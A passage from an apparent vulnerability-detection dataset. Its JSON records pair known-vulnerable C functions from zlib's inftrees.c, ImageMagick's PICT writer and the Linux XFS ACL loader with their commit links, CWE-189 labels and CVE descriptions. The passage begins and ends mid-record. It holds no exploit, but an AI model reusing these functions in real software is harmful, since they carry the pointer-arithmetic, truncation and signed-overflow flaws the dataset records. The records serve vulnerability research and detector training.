OFF;\n     strm->avail_in = (unsigned)(in < last ? 5 + (last - in) : 5 - (in - last));\n     strm->avail_out = (unsigned)(out < end ?\n                                  257 + (end - out) : 257 - (out - end));\n    state->hold = hold;\n    state->bits = bits;\n    return;\n}\n", "func_hash": 180070009003744174012989678309405495673, "file_name": "inffast.c", "file_hash": 141923369108859484006424455271803703762, "cwe": ["CWE-189"], "cve": "CVE-2016-9841", "cve_desc": "inffast.c in zlib 1.2.8 might allow context-dependent attackers to have unspecified impact by leveraging improper pointer arithmetic.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-9841"}
{"idx": 3244, "project": "zlib", "commit_id": "6a043145ca6e9c55184013841a67b2fef87e44c0", "project_url": "https://github.com/madler/zlib", "commit_url": "https://github.com/madler/zlib/commit/6a043145ca6e9c55184013841a67b2fef87e44c0", "commit_message": "Remove offset pointer optimization in inftrees.c.\n\ninftrees.c was subtracting an offset from a pointer to an array,\nin order to provide a pointer that allowed indexing starting at\nthe offset. This is not compliant with the C standard, for which\nthe behavior of a pointer decremented before its allocated memory\nis undefined. Per the recommendation of a security audit of the\nzlib code by Trail of Bits and TrustInSoft, in support of the\nMozilla Foundation, this tiny optimization was removed, in order\nto avoid the possibility of undefined behavior.", "target": 1, "func": "int ZLIB_INTERNAL inflate_table(type, lens, codes, table, bits, work)\ncodetype type;\nunsigned short FAR *lens;\nunsigned codes;\ncode FAR * FAR *table;\nunsigned FAR *bits;\nunsigned short FAR *work;\n{\n    unsigned len;               /* a code's length in bits */\n    unsigned sym;               /* index of code symbols */\n    unsigned min, max;          /* minimum and maximum code lengths */\n    unsigned root;              /* number of index bits for root table */\n    unsigned curr;              /* number of index bits for current table */\n    unsigned drop;              /* code bits to drop for sub-table */\n    int left;                   /* number of prefix codes available */\n    unsigned used;              /* code entries in table used */\n    unsigned huff;              /* Huffman code */\n    unsigned incr;              /* for incrementing code, index */\n    unsigned fill;              /* index for replicating entries */\n    unsigned low;               /* low bits for current root entry */\n    unsigned mask;              /* mask for low root bits */\n    code here;                  /* table entry for duplication */\n     code FAR *next;             /* next available space in table */\n     const unsigned short FAR *base;     /* base value table to use */\n     const unsigned short FAR *extra;    /* extra bits table to use */\n    int end;                    /* use base and extra for symbol > end */\n     unsigned short count[MAXBITS+1];    /* number of codes of each length */\n     unsigned short offs[MAXBITS+1];     /* offsets in table for each length */\n     static const unsigned short lbase[31] = { /* Length codes 257..285 base */\n        3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31,\n        35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258, 0, 0};\n    static const unsigned short lext[31] = { /* Length codes 257..285 extra */\n        16, 16, 16, 16, 16, 16, 16, 16, 17, 17, 17, 17, 18, 18, 18, 18,\n        19, 19, 19, 19, 20, 20, 20, 20, 21, 21, 21, 21, 16, 203, 198};\n    static const unsigned short dbase[32] = { /* Distance codes 0..29 base */\n        1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193,\n        257, 385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145,\n        8193, 12289, 16385, 24577, 0, 0};\n    static const unsigned short dext[32] = { /* Distance codes 0..29 extra */\n        16, 16, 16, 16, 17, 17, 18, 18, 19, 19, 20, 20, 21, 21, 22, 22,\n        23, 23, 24, 24, 25, 25, 26, 26, 27, 27,\n        28, 28, 29, 29, 64, 64};\n\n    /*\n       Process a set of code lengths to create a canonical Huffman code.  The\n       code lengths are lens[0..codes-1].  Each length corresponds to the\n       symbols 0..codes-1.  The Huffman code is generated by first sorting the\n       symbols by length from short to long, and retaining the symbol order\n       for codes with equal lengths.  Then the code starts with all zero bits\n       for the first code of the shortest length, and the codes are integer\n       increments for the same length, and zeros are appended as the length\n       increases.  For the deflate format, these bits are stored backwards\n       from their more natural integer increment ordering, and so when the\n       decoding tables are built in the large loop below, the integer codes\n       are incremented backwards.\n\n       This routine assumes, but does not check, that all of the entries in\n       lens[] are in the range 0..MAXBITS.  The caller must assure this.\n       1..MAXBITS is interpreted as that code length.  zero means that that\n       symbol does not occur in this code.\n\n       The codes are sorted by computing a count of codes for each length,\n       creating from that a table of starting indices for each length in the\n       sorted table, and then entering the symbols in order in the sorted\n       table.  The sorted table is work[], with that space being provided by\n       the caller.\n\n       The length counts are used for other purposes as well, i.e. finding\n       the minimum and maximum length codes, determining if there are any\n       codes at all, checking for a valid set of lengths, and looking ahead\n       at length counts to determine sub-table sizes when building the\n       decoding tables.\n     */\n\n    /* accumulate lengths for codes (assumes lens[] all in 0..MAXBITS) */\n    for (len = 0; len <= MAXBITS; len++)\n        count[len] = 0;\n    for (sym = 0; sym < codes; sym++)\n        count[lens[sym]]++;\n\n    /* bound code lengths, force root to be within code lengths */\n    root = *bits;\n    for (max = MAXBITS; max >= 1; max--)\n        if (count[max] != 0) break;\n    if (root > max) root = max;\n    if (max == 0) {                     /* no symbols to code at all */\n        here.op = (unsigned char)64;    /* invalid code marker */\n        here.bits = (unsigned char)1;\n        here.val = (unsigned short)0;\n        *(*table)++ = here;             /* make a table to force an error */\n        *(*table)++ = here;\n        *bits = 1;\n        return 0;     /* no symbols, but wait for decoding to report error */\n    }\n    for (min = 1; min < max; min++)\n        if (count[min] != 0) break;\n    if (root < min) root = min;\n\n    /* check for an over-subscribed or incomplete set of lengths */\n    left = 1;\n    for (len = 1; len <= MAXBITS; len++) {\n        left <<= 1;\n        left -= count[len];\n        if (left < 0) return -1;        /* over-subscribed */\n    }\n    if (left > 0 && (type == CODES || max != 1))\n        return -1;                      /* incomplete set */\n\n    /* generate offsets into symbol table for each length for sorting */\n    offs[1] = 0;\n    for (len = 1; len < MAXBITS; len++)\n        offs[len + 1] = offs[len] + count[len];\n\n    /* sort symbols by length, by symbol order within each length */\n    for (sym = 0; sym < codes; sym++)\n        if (lens[sym] != 0) work[offs[lens[sym]]++] = (unsigned short)sym;\n\n    /*\n       Create and fill in decoding tables.  In this loop, the table being\n       filled is at next and has curr index bits.  The code being used is huff\n       with length len.  That code is converted to an index by dropping drop\n       bits off of the bottom.  For codes where len is less than drop + curr,\n       those top drop + curr - len bits are incremented through all values to\n       fill the table with replicated entries.\n\n       root is the number of index bits for the root table.  When len exceeds\n       root, sub-tables are created pointed to by the root entry with an index\n       of the low root bits of huff.  This is saved in low to check for when a\n       new sub-table should be started.  drop is zero when the root table is\n       being filled, and drop is root when sub-tables are being filled.\n\n       When a new sub-table is needed, it is necessary to look ahead in the\n       code lengths to determine what size sub-table is needed.  The length\n       counts are used for this, and so count[] is decremented as codes are\n       entered in the tables.\n\n       used keeps track of how many table entries have been allocated from the\n       provided *table space.  It is checked for LENS and DIST tables against\n       the constants ENOUGH_LENS and ENOUGH_DISTS to guard against changes in\n       the initial root table size constants.  See the comments in inftrees.h\n       for more information.\n\n       sym increments through all symbols, and the loop terminates when\n       all codes of length max, i.e. all codes, have been processed.  This\n       routine permits incomplete codes, so another loop after this one fills\n       in the rest of the decoding tables with invalid code markers.\n     */\n\n    /* set up for code type */\n     switch (type) {\n     case CODES:\n         base = extra = work;    /* dummy value--not used */\n        end = 19;\n         break;\n     case LENS:\n         base = lbase;\n        base -= 257;\n         extra = lext;\n        extra -= 257;\n        end = 256;\n         break;\n     default:            /* DISTS */\n         base = dbase;\n         extra = dext;\n        end = -1;\n     }\n \n     /* initialize state for loop */\n    huff = 0;                   /* starting code */\n    sym = 0;                    /* starting code symbol */\n    len = min;                  /* starting code length */\n    next = *table;              /* current table to fill in */\n    curr = root;                /* current table index bits */\n    drop = 0;                   /* current bits to drop from code for index */\n    low = (unsigned)(-1);       /* trigger new sub-table when len > root */\n    used = 1U << root;          /* use root table entries */\n    mask = used - 1;            /* mask for comparing low */\n\n    /* check available table space */\n    if ((type == LENS && used > ENOUGH_LENS) ||\n        (type == DISTS && used > ENOUGH_DISTS))\n        return 1;\n\n    /* process all codes and make table entries */\n     for (;;) {\n         /* create table entry */\n         here.bits = (unsigned char)(len - drop);\n        if ((int)(work[sym]) < end) {\n             here.op = (unsigned char)0;\n             here.val = work[sym];\n         }\n        else if ((int)(work[sym]) > end) {\n            here.op = (unsigned char)(extra[work[sym]]);\n            here.val = base[work[sym]];\n         }\n         else {\n             here.op = (unsigned char)(32 + 64);         /* end of block */\n            here.val = 0;\n        }\n\n        /* replicate for those indices with low len bits equal to huff */\n        incr = 1U << (len - drop);\n        fill = 1U << curr;\n        min = fill;                 /* save offset to next table */\n        do {\n            fill -= incr;\n            next[(huff >> drop) + fill] = here;\n        } while (fill != 0);\n\n        /* backwards increment the len-bit code huff */\n        incr = 1U << (len - 1);\n        while (huff & incr)\n            incr >>= 1;\n        if (incr != 0) {\n            huff &= incr - 1;\n            huff += incr;\n        }\n        else\n            huff = 0;\n\n        /* go to next symbol, update count, len */\n        sym++;\n        if (--(count[len]) == 0) {\n            if (len == max) break;\n            len = lens[work[sym]];\n        }\n\n        /* create new sub-table if needed */\n        if (len > root && (huff & mask) != low) {\n            /* if first time, transition to sub-tables */\n            if (drop == 0)\n                drop = root;\n\n            /* increment past last table */\n            next += min;            /* here min is 1 << curr */\n\n            /* determine length of next table */\n            curr = len - drop;\n            left = (int)(1 << curr);\n            while (curr + drop < max) {\n                left -= count[curr + drop];\n                if (left <= 0) break;\n                curr++;\n                left <<= 1;\n            }\n\n            /* check for enough space */\n            used += 1U << curr;\n            if ((type == LENS && used > ENOUGH_LENS) ||\n                (type == DISTS && used > ENOUGH_DISTS))\n                return 1;\n\n            /* point entry in root table to sub-table */\n            low = huff & mask;\n            (*table)[low].op = (unsigned char)curr;\n            (*table)[low].bits = (unsigned char)root;\n            (*table)[low].val = (unsigned short)(next - *table);\n        }\n    }\n\n    /* fill in remaining table entry if code is incomplete (guaranteed to have\n       at most one remaining entry, since if the code is incomplete, the\n       maximum code length that was allowed to get this far is one bit) */\n    if (huff != 0) {\n        here.op = (unsigned char)64;            /* invalid code marker */\n        here.bits = (unsigned char)(len - drop);\n        here.val = (unsigned short)0;\n        next[huff] = here;\n    }\n\n    /* set return parameters */\n    *table += used;\n    *bits = root;\n    return 0;\n}\n", "func_hash": 267171999140286590301689762265666243192, "file_name": "inftrees.c", "file_hash": 83840119816087030251805441791731521405, "cwe": ["CWE-189"], "cve": "CVE-2016-9840", "cve_desc": "inftrees.c in zlib 1.2.8 might allow context-dependent attackers to have unspecified impact by leveraging improper pointer arithmetic.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-9840"}
{"idx": 3408, "project": "ImageMagick", "commit_id": "0f6fc2d5bf8f500820c3dbcf0d23ee14f2d9f734", "project_url": "https://github.com/ImageMagick/ImageMagick", "commit_url": "https://github.com/ImageMagick/ImageMagick/commit/0f6fc2d5bf8f500820c3dbcf0d23ee14f2d9f734", "commit_message": "", "target": 1, "func": "static MagickBooleanType WritePICTImage(const ImageInfo *image_info,\n  Image *image,ExceptionInfo *exception)\n{\n#define MaxCount  128\n#define PictCropRegionOp  0x01\n#define PictEndOfPictureOp  0xff\n#define PictJPEGOp  0x8200\n#define PictInfoOp  0x0C00\n#define PictInfoSize  512\n#define PictPixmapOp  0x9A\n#define PictPICTOp  0x98\n#define PictVersion  0x11\n\n  const StringInfo\n    *profile;\n\n  double\n    x_resolution,\n    y_resolution;\n\n  MagickBooleanType\n    status;\n\n  MagickOffsetType\n    offset;\n\n  PICTPixmap\n    pixmap;\n\n  PICTRectangle\n    bounds,\n    crop_rectangle,\n    destination_rectangle,\n    frame_rectangle,\n    size_rectangle,\n    source_rectangle;\n\n  register const Quantum\n    *p;\n\n  register ssize_t\n    i,\n    x;\n\n   size_t\n     bytes_per_line,\n     count,\n     storage_class;\n \n   ssize_t\n    y;\n\n  unsigned char\n    *buffer,\n    *packed_scanline,\n    *scanline;\n \n   unsigned short\n     base_address,\n    row_bytes,\n     transfer_mode;\n \n   /*\n    Open output image file.\n  */\n  assert(image_info != (const ImageInfo *) NULL);\n  assert(image_info->signature == MagickSignature);\n  assert(image != (Image *) NULL);\n  assert(image->signature == MagickSignature);\n  if (image->debug != MagickFalse)\n    (void) LogMagickEvent(TraceEvent,GetMagickModule(),\"%s\",image->filename);\n  if ((image->columns > 65535L) || (image->rows > 65535L))\n    ThrowWriterException(ImageError,\"WidthOrHeightExceedsLimit\");\n  assert(exception != (ExceptionInfo *) NULL);\n  assert(exception->signature == MagickSignature);\n  status=OpenBlob(image_info,image,WriteBinaryBlobMode,exception);\n  if (status == MagickFalse)\n    return(status);\n  (void) TransformImageColorspace(image,sRGBColorspace,exception);\n  /*\n    Initialize image info.\n  */\n  size_rectangle.top=0;\n  size_rectangle.left=0;\n  size_rectangle.bottom=(short) image->rows;\n  size_rectangle.right=(short) image->columns;\n  frame_rectangle=size_rectangle;\n  crop_rectangle=size_rectangle;\n   source_rectangle=size_rectangle;\n   destination_rectangle=size_rectangle;\n   base_address=0xff;\n  row_bytes=(unsigned short) (image->columns | 0x8000);\n   bounds.top=0;\n   bounds.left=0;\n   bounds.bottom=(short) image->rows;\n  bounds.right=(short) image->columns;\n  pixmap.version=0;\n  pixmap.pack_type=0;\n  pixmap.pack_size=0;\n  pixmap.pixel_type=0;\n  pixmap.bits_per_pixel=8;\n  pixmap.component_count=1;\n  pixmap.component_size=8;\n  pixmap.plane_bytes=0;\n  pixmap.table=0;\n  pixmap.reserved=0;\n  transfer_mode=0;\n  x_resolution=image->resolution.x != 0.0 ? image->resolution.x :\n    DefaultResolution;\n  y_resolution=image->resolution.y != 0.0 ? image->resolution.y :\n    DefaultResolution;\n  storage_class=image->storage_class;\n  if (image_info->compression == JPEGCompression)\n    storage_class=DirectClass;\n  if (storage_class == DirectClass)\n    {\n      pixmap.component_count=image->alpha_trait != UndefinedPixelTrait ? 4 : 3;\n      pixmap.pixel_type=16;\n       pixmap.bits_per_pixel=32;\n       pixmap.pack_type=0x04;\n       transfer_mode=0x40;\n      row_bytes=(unsigned short) ((4*image->columns) | 0x8000);\n     }\n   /*\n     Allocate memory.\n  */\n  bytes_per_line=image->columns;\n  if (storage_class == DirectClass)\n    bytes_per_line*=image->alpha_trait != UndefinedPixelTrait ? 4 : 3;\n  buffer=(unsigned char *) AcquireQuantumMemory(PictInfoSize,sizeof(*buffer));\n  packed_scanline=(unsigned char *) AcquireQuantumMemory((size_t)\n   (row_bytes+MaxCount),sizeof(*packed_scanline));\n  scanline=(unsigned char *) AcquireQuantumMemory(row_bytes,sizeof(*scanline));\n  if ((buffer == (unsigned char *) NULL) ||\n      (packed_scanline == (unsigned char *) NULL) ||\n      (scanline == (unsigned char *) NULL))\n    ThrowWriterException(ResourceLimitError,\"MemoryAllocationFailed\");\n  (void) ResetMagickMemory(scanline,0,row_bytes);\n  (void) ResetMagickMemory(packed_scanline,0,(size_t) (row_bytes+MaxCount));\n  /*\n    Write header, header size, size bounding box, version, and reserved.\n  */\n  (void) ResetMagickMemory(buffer,0,PictInfoSize);\n  (void) WriteBlob(image,PictInfoSize,buffer);\n  (void) WriteBlobMSBShort(image,0);\n  (void) WriteBlobMSBShort(image,(unsigned short) size_rectangle.top);\n  (void) WriteBlobMSBShort(image,(unsigned short) size_rectangle.left);\n  (void) WriteBlobMSBShort(image,(unsigned short) size_rectangle.bottom);\n  (void) WriteBlobMSBShort(image,(unsigned short) size_rectangle.right);\n  (void) WriteBlobMSBShort(image,PictVersion);\n  (void) WriteBlobMSBShort(image,0x02ff);  /* version #2 */\n  (void) WriteBlobMSBShort(image,PictInfoOp);\n  (void) WriteBlobMSBLong(image,0xFFFE0000UL);\n  /*\n    Write full size of the file, resolution, frame bounding box, and reserved.\n  */\n  (void) WriteBlobMSBShort(image,(unsigned short) x_resolution);\n  (void) WriteBlobMSBShort(image,0x0000);\n  (void) WriteBlobMSBShort(image,(unsigned short) y_resolution);\n  (void) WriteBlobMSBShort(image,0x0000);\n  (void) WriteBlobMSBShort(image,(unsigned short) frame_rectangle.top);\n  (void) WriteBlobMSBShort(image,(unsigned short) frame_rectangle.left);\n  (void) WriteBlobMSBShort(image,(unsigned short) frame_rectangle.bottom);\n  (void) WriteBlobMSBShort(image,(unsigned short) frame_rectangle.right);\n  (void) WriteBlobMSBLong(image,0x00000000L);\n  profile=GetImageProfile(image,\"iptc\");\n  if (profile != (StringInfo *) NULL)\n    {\n      (void) WriteBlobMSBShort(image,0xa1);\n      (void) WriteBlobMSBShort(image,0x1f2);\n      (void) WriteBlobMSBShort(image,(unsigned short)\n        (GetStringInfoLength(profile)+4));\n      (void) WriteBlobString(image,\"8BIM\");\n      (void) WriteBlob(image,GetStringInfoLength(profile),\n        GetStringInfoDatum(profile));\n    }\n  profile=GetImageProfile(image,\"icc\");\n  if (profile != (StringInfo *) NULL)\n    {\n      (void) WriteBlobMSBShort(image,0xa1);\n      (void) WriteBlobMSBShort(image,0xe0);\n      (void) WriteBlobMSBShort(image,(unsigned short)\n        (GetStringInfoLength(profile)+4));\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlob(image,GetStringInfoLength(profile),\n        GetStringInfoDatum(profile));\n      (void) WriteBlobMSBShort(image,0xa1);\n      (void) WriteBlobMSBShort(image,0xe0);\n      (void) WriteBlobMSBShort(image,4);\n      (void) WriteBlobMSBLong(image,0x00000002UL);\n    }\n  /*\n    Write crop region opcode and crop bounding box.\n  */\n  (void) WriteBlobMSBShort(image,PictCropRegionOp);\n  (void) WriteBlobMSBShort(image,0xa);\n  (void) WriteBlobMSBShort(image,(unsigned short) crop_rectangle.top);\n  (void) WriteBlobMSBShort(image,(unsigned short) crop_rectangle.left);\n  (void) WriteBlobMSBShort(image,(unsigned short) crop_rectangle.bottom);\n  (void) WriteBlobMSBShort(image,(unsigned short) crop_rectangle.right);\n  if (image_info->compression == JPEGCompression)\n    {\n      Image\n        *jpeg_image;\n\n      ImageInfo\n        *jpeg_info;\n\n      size_t\n        length;\n\n      unsigned char\n        *blob;\n\n      jpeg_image=CloneImage(image,0,0,MagickTrue,exception);\n      if (jpeg_image == (Image *) NULL)\n        {\n          (void) CloseBlob(image);\n          return(MagickFalse);\n        }\n      jpeg_info=CloneImageInfo(image_info);\n      (void) CopyMagickString(jpeg_info->magick,\"JPEG\",MagickPathExtent);\n      length=0;\n      blob=(unsigned char *) ImageToBlob(jpeg_info,jpeg_image,&length,\n        exception);\n      jpeg_info=DestroyImageInfo(jpeg_info);\n      if (blob == (unsigned char *) NULL)\n        return(MagickFalse);\n      jpeg_image=DestroyImage(jpeg_image);\n      (void) WriteBlobMSBShort(image,PictJPEGOp);\n      (void) WriteBlobMSBLong(image,(unsigned int) length+154);\n      (void) WriteBlobMSBShort(image,0x0000);\n      (void) WriteBlobMSBLong(image,0x00010000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00010000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x40000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00400000UL);\n      (void) WriteBlobMSBShort(image,0x0000);\n      (void) WriteBlobMSBShort(image,(unsigned short) image->rows);\n      (void) WriteBlobMSBShort(image,(unsigned short) image->columns);\n      (void) WriteBlobMSBShort(image,0x0000);\n      (void) WriteBlobMSBShort(image,768);\n      (void) WriteBlobMSBShort(image,0x0000);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00566A70UL);\n      (void) WriteBlobMSBLong(image,0x65670000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000001UL);\n      (void) WriteBlobMSBLong(image,0x00016170UL);\n      (void) WriteBlobMSBLong(image,0x706C0000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBShort(image,768);\n      (void) WriteBlobMSBShort(image,(unsigned short) image->columns);\n      (void) WriteBlobMSBShort(image,(unsigned short) image->rows);\n      (void) WriteBlobMSBShort(image,(unsigned short) x_resolution);\n      (void) WriteBlobMSBShort(image,0x0000);\n      (void) WriteBlobMSBShort(image,(unsigned short) y_resolution);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x87AC0001UL);\n      (void) WriteBlobMSBLong(image,0x0B466F74UL);\n      (void) WriteBlobMSBLong(image,0x6F202D20UL);\n      (void) WriteBlobMSBLong(image,0x4A504547UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x0018FFFFUL);\n      (void) WriteBlob(image,length,blob);\n      if ((length & 0x01) != 0)\n        (void) WriteBlobByte(image,'\\0');\n      blob=(unsigned char *) RelinquishMagickMemory(blob);\n    }\n  /*\n    Write picture opcode, row bytes, and picture bounding box, and version.\n  */\n  if (storage_class == PseudoClass)\n    (void) WriteBlobMSBShort(image,PictPICTOp);\n  else\n    {\n      (void) WriteBlobMSBShort(image,PictPixmapOp);\n      (void) WriteBlobMSBLong(image,(size_t) base_address);\n    }\n  (void) WriteBlobMSBShort(image,(unsigned short) (row_bytes | 0x8000));\n  (void) WriteBlobMSBShort(image,(unsigned short) bounds.top);\n  (void) WriteBlobMSBShort(image,(unsigned short) bounds.left);\n  (void) WriteBlobMSBShort(image,(unsigned short) bounds.bottom);\n  (void) WriteBlobMSBShort(image,(unsigned short) bounds.right);\n  /*\n    Write pack type, pack size, resolution, pixel type, and pixel size.\n  */\n  (void) WriteBlobMSBShort(image,(unsigned short) pixmap.version);\n  (void) WriteBlobMSBShort(image,(unsigned short) pixmap.pack_type);\n  (void) WriteBlobMSBLong(image,(unsigned int) pixmap.pack_size);\n  (void) WriteBlobMSBShort(image,(unsigned short) (x_resolution+0.5));\n  (void) WriteBlobMSBShort(image,0x0000);\n  (void) WriteBlobMSBShort(image,(unsigned short) (y_resolution+0.5));\n  (void) WriteBlobMSBShort(image,0x0000);\n  (void) WriteBlobMSBShort(image,(unsigned short) pixmap.pixel_type);\n  (void) WriteBlobMSBShort(image,(unsigned short) pixmap.bits_per_pixel);\n  /*\n    Write component count, size, plane bytes, table size, and reserved.\n  */\n  (void) WriteBlobMSBShort(image,(unsigned short) pixmap.component_count);\n  (void) WriteBlobMSBShort(image,(unsigned short) pixmap.component_size);\n  (void) WriteBlobMSBLong(image,(unsigned int) pixmap.plane_bytes);\n  (void) WriteBlobMSBLong(image,(unsigned int) pixmap.table);\n  (void) WriteBlobMSBLong(image,(unsigned int) pixmap.reserved);\n  if (storage_class == PseudoClass)\n    {\n      /*\n        Write image colormap.\n      */\n      (void) WriteBlobMSBLong(image,0x00000000L);  /* color seed */\n      (void) WriteBlobMSBShort(image,0L);  /* color flags */\n      (void) WriteBlobMSBShort(image,(unsigned short) (image->colors-1));\n      for (i=0; i < (ssize_t) image->colors; i++)\n      {\n        (void) WriteBlobMSBShort(image,(unsigned short) i);\n        (void) WriteBlobMSBShort(image,ScaleQuantumToShort(\n          image->colormap[i].red));\n        (void) WriteBlobMSBShort(image,ScaleQuantumToShort(\n          image->colormap[i].green));\n        (void) WriteBlobMSBShort(image,ScaleQuantumToShort(\n          image->colormap[i].blue));\n      }\n    }\n  /*\n    Write source and destination rectangle.\n  */\n  (void) WriteBlobMSBShort(image,(unsigned short) source_rectangle.top);\n  (void) WriteBlobMSBShort(image,(unsigned short) source_rectangle.left);\n  (void) WriteBlobMSBShort(image,(unsigned short) source_rectangle.bottom);\n  (void) WriteBlobMSBShort(image,(unsigned short) source_rectangle.right);\n  (void) WriteBlobMSBShort(image,(unsigned short) destination_rectangle.top);\n  (void) WriteBlobMSBShort(image,(unsigned short) destination_rectangle.left);\n  (void) WriteBlobMSBShort(image,(unsigned short) destination_rectangle.bottom);\n  (void) WriteBlobMSBShort(image,(unsigned short) destination_rectangle.right);\n  (void) WriteBlobMSBShort(image,(unsigned short) transfer_mode);\n  /*\n    Write picture data.\n  */\n  count=0;\n  if (storage_class == PseudoClass)\n    for (y=0; y < (ssize_t) image->rows; y++)\n    {\n      p=GetVirtualPixels(image,0,y,image->columns,1,exception);\n      if (p == (const Quantum *) NULL)\n        break;\n      for (x=0; x < (ssize_t) image->columns; x++)\n      {\n        scanline[x]=(unsigned char) GetPixelIndex(image,p);\n        p+=GetPixelChannels(image);\n      }\n      count+=EncodeImage(image,scanline,(size_t) (row_bytes & 0x7FFF),\n        packed_scanline);\n      if (image->previous == (Image *) NULL)\n        {\n          status=SetImageProgress(image,SaveImageTag,(MagickOffsetType) y,\n            image->rows);\n          if (status == MagickFalse)\n            break;\n        }\n    }\n  else\n    if (image_info->compression == JPEGCompression)\n      {\n        (void) ResetMagickMemory(scanline,0,row_bytes);\n        for (y=0; y < (ssize_t) image->rows; y++)\n          count+=EncodeImage(image,scanline,(size_t) (row_bytes & 0x7FFF),\n            packed_scanline);\n      }\n    else\n      {\n        register unsigned char\n          *blue,\n          *green,\n          *opacity,\n          *red;\n\n        red=scanline;\n        green=scanline+image->columns;\n        blue=scanline+2*image->columns;\n        opacity=scanline+3*image->columns;\n        for (y=0; y < (ssize_t) image->rows; y++)\n        {\n          p=GetVirtualPixels(image,0,y,image->columns,1,exception);\n          if (p == (const Quantum *) NULL)\n            break;\n          red=scanline;\n          green=scanline+image->columns;\n          blue=scanline+2*image->columns;\n          if (image->alpha_trait != UndefinedPixelTrait)\n            {\n              opacity=scanline;\n              red=scanline+image->columns;\n              green=scanline+2*image->columns;\n              blue=scanline+3*image->columns;\n            }\n          for (x=0; x < (ssize_t) image->columns; x++)\n          {\n            *red++=ScaleQuantumToChar(GetPixelRed(image,p));\n            *green++=ScaleQuantumToChar(GetPixelGreen(image,p));\n            *blue++=ScaleQuantumToChar(GetPixelBlue(image,p));\n            if (image->alpha_trait != UndefinedPixelTrait)\n              *opacity++=ScaleQuantumToChar((Quantum) (GetPixelAlpha(image,p)));\n            p+=GetPixelChannels(image);\n          }\n          count+=EncodeImage(image,scanline,bytes_per_line & 0x7FFF,\n            packed_scanline);\n          if (image->previous == (Image *) NULL)\n            {\n              status=SetImageProgress(image,SaveImageTag,(MagickOffsetType) y,\n                image->rows);\n              if (status == MagickFalse)\n                break;\n            }\n        }\n      }\n  if ((count & 0x01) != 0)\n    (void) WriteBlobByte(image,'\\0');\n  (void) WriteBlobMSBShort(image,PictEndOfPictureOp);\n  offset=TellBlob(image);\n  offset=SeekBlob(image,512,SEEK_SET);\n  (void) WriteBlobMSBShort(image,(unsigned short) offset);\n  scanline=(unsigned char *) RelinquishMagickMemory(scanline);\n  packed_scanline=(unsigned char *) RelinquishMagickMemory(packed_scanline);\n  buffer=(unsigned char *) RelinquishMagickMemory(buffer);\n  (void) CloseBlob(image);\n  return(MagickTrue);\n}\n", "func_hash": 268543993326910665529000625352797706014, "file_name": "pict.c", "file_hash": 191832857215210369839373567612680519447, "cwe": ["CWE-189"], "cve": "CVE-2015-8896", "cve_desc": "Integer truncation issue in coders/pict.c in ImageMagick before 7.0.5-0 allows remote attackers to cause a denial of service (application crash) via a crafted .pict file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-8896"}
{"idx": 4223, "project": "linux", "commit_id": "093019cf1b18dd31b2c3b77acce4e000e2cbc9ce", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/093019cf1b18dd31b2c3b77acce4e000e2cbc9ce", "commit_message": "xfs: fix acl count validation in xfs_acl_from_disk()\n\nCommit fa8b18ed didn't prevent the integer overflow and possible\nmemory corruption.  \"count\" can go negative and bypass the check.\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nReviewed-by: Christoph Hellwig <hch@lst.de>\nSigned-off-by: Ben Myers <bpm@sgi.com>", "target": 1, "func": "xfs_acl_from_disk(struct xfs_acl *aclp)\n{\n \tstruct posix_acl_entry *acl_e;\n \tstruct posix_acl *acl;\n \tstruct xfs_acl_entry *ace;\n\tint count, i;\n \n \tcount = be32_to_cpu(aclp->acl_cnt);\n \tif (count > XFS_ACL_MAX_ENTRIES)\n\t\treturn ERR_PTR(-EFSCORRUPTED);\n\n\tacl = posix_acl_alloc(count, GFP_KERNEL);\n\tif (!acl)\n\t\treturn ERR_PTR(-ENOMEM);\n\n\tfor (i = 0; i < count; i++) {\n\t\tacl_e = &acl->a_entries[i];\n\t\tace = &aclp->acl_entry[i];\n\n\t\t/*\n\t\t * The tag is 32 bits on disk and 16 bits in core.\n\t\t *\n\t\t * Because every access to it goes through the core\n\t\t * format first this is not a problem.\n\t\t */\n\t\tacl_e->e_tag = be32_to_cpu(ace->ae_tag);\n\t\tacl_e->e_perm = be16_to_cpu(ace->ae_perm);\n\n\t\tswitch (acl_e->e_tag) {\n\t\tcase ACL_USER:\n\t\tcase ACL_GROUP:\n\t\t\tacl_e->e_id = be32_to_cpu(ace->ae_id);\n\t\t\tbreak;\n\t\tcase ACL_USER_OBJ:\n\t\tcase ACL_GROUP_OBJ:\n\t\tcase ACL_MASK:\n\t\tcase ACL_OTHER:\n\t\t\tacl_e->e_id = ACL_UNDEFINED_ID;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tgoto fail;\n\t\t}\n\t}\n\treturn 